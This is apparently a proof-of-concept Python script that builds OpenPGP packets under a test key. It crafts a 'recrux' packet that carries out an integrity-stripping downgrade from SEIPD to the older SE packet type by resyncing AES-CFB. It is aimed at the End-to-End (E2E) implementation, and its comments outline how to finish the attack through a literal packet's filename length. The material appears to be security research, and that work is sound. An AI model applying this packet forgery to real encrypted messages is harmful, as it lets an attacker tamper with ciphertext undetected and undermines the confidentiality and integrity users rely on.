from __future__ import division, print_function

from binascii import hexlify, unhexlify
from hashlib import sha1, sha256
from Crypto.Cipher import AES

#LITERAL = bytearray([
#    0xc0 | 11, 1 + 4 + 1 + 4, 'u', 0, 0, 0, 0, 0, 'm', 'd', 'c', '?'])
LITERAL = bytearray([
    0x80 | (11 << 2) | 3, 'u', 0, 0, 0, 0, 0, 'm', 'd', 'c', '?'])

IV = '\x00' * 16

prefix = IV + IV[14:16]
payload = bytes(prefix + LITERAL + '\xd3\x14')
mdc = sha1(payload).digest()
payload += mdc

KEY = sha256('test').digest()[:32]
padlen = 16 - (len(payload) % 16)
padded_payload = payload + '\x00'*padlen
SEIPD_PAYLOAD = AES.new(KEY, mode=AES.MODE_CFB,
                        IV='\x00'*16, segment_size=128).encrypt(padded_payload)[:len(payload)]

SEIPD = bytearray([
    0xc0 | 18,  # SEIPD
    len(SEIPD_PAYLOAD) + 1, 1]) + SEIPD_PAYLOAD

def xor(it1, it2):
  return bytes(bytearray([x1 ^ x2 for x1, x2
                          in zip(bytearray(it1), bytearray(it2))]))


SE_PAYLOAD = AES.new(KEY, mode=AES.MODE_OPENPGP, iv=IV).encrypt(bytes(LITERAL))

#SE = bytearray([
#    0x80 | (9 << 2) | 3]) + SE_PAYLOAD
SE = bytearray([0xc0 | 9, len(SE_PAYLOAD)]) + SE_PAYLOAD
SKESK = bytearray([
    0xc0 | 3, # SKESK
    4,        # len == 4
    0x04,     # v4
    0x09,     # AES-256
    0x00,     # S2K simple
    0x08      # SHA256
    ])

open('seipd.test', 'wb').write(SKESK + SEIPD)
open('se.test', 'wb').write(SKESK + SE)

twobytes = '\x00\x00'
twobytes = '\xf6\xe3' # magic, or 2^16 tries
recrux = bytes('\x00\x00' + SEIPD_PAYLOAD[0:16]
               + twobytes + SEIPD_PAYLOAD[18:18+len(LITERAL)])
recruxpad = recrux + '\x00' * 32

# Implementation in E2E.
derecrux = (AES.new(KEY, mode=AES.MODE_CFB, IV=recrux[2:18],
                    segment_size=128)
            .decrypt(recruxpad[18:34])[:len(LITERAL)+2])
#fullsync = AES.new(KEY, mode=AES.MODE_OPENPGP,
#                   IV=recrux[0:18]).decrypt(recrux[18:])
#print(repr(fullsync)) PyCrypto does not like this very much...
print(repr(LITERAL))
print(repr(derecrux))
recrux_packet = SKESK + '\xa7' + recrux
open('recrux.test', 'wb').write(recrux_packet)

# And, alas, E2E doesn't care for uncompressed compressed packets.
#
# (But the downgrade attack otherwise works fine.)
#
# Assume, as before, that the target plaintext is known (since
# otherwise you can't usefully modify it).
#
# Here's how to make the attack work: Aim for an old-style literal
# packet with indeterminate length, followed by 'u' or 't'. Now,
# (using the known plaintext) write out a literal packet with a
# *filename length* sufficient to hide two bad blocks. Resync to
# the prefix, and then go on from there. p=2^-15!


result = """-----BEGIN PGP MESSAGE-----
Charset: UTF-8

wwQECQAIpwAAawLiQYeMw7vdoPcZz3UU7Pbj/iDZslxABeTlSnc=
=/r2A
-----END PGP MESSAGE-----"""

print(repr([x for x in bytearray(recrux_packet)]))
